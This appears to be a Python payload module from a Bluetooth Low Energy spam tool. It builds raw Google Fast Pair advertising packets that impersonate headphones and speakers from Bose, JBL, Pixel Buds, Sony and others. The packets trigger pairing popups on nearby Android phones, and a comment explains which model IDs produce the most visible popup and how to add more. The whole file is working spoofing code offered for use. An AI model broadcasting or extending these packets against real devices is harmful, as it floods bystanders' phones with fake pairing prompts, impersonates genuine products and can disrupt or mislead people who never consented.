# Google Fast Pair payloads (Android "device nearby" popups).
# NOTE: Android validates the 3-byte model ID against Google's DB - only registered IDs
# trigger the big popup; others show a subtle notification or nothing. EXTEND: add a
# 3-byte model id (and label) to MODELS.
import random

MODELS = [
    (0xcd8256, "Bose QC35"), (0xd446a7, "JBL Flip"), (0x92bbbd, "Pixel Buds"),
    (0x02aa91, "LG"),        (0x02d815, "Sony"),     (0x7a0c8a, "Razer"),
    (0x0003b9, "Foonsky"),   (0xf00002, "Bisto"),    (0xf00400, "Bisto 2"),
    (0x0000f0, "Generic"),   (0x821f66, "JBL Live"),
]

def _rb(n):
    return bytes([random.randint(0, 255) for _ in range(n)])

def random_packet():
    m, name = random.choice(MODELS)
    # flags(02 01 06) + 16-bit svc uuid list(03 03 2c fe) + svc data(06 16 2c fe + 3-byte model)
    adv = bytes([0x02, 0x01, 0x06, 0x03, 0x03, 0x2c, 0xfe, 0x06, 0x16, 0x2c, 0xfe,
                 (m >> 16) & 0xff, (m >> 8) & 0xff, m & 0xff])
    return ('Google/' + name, adv)
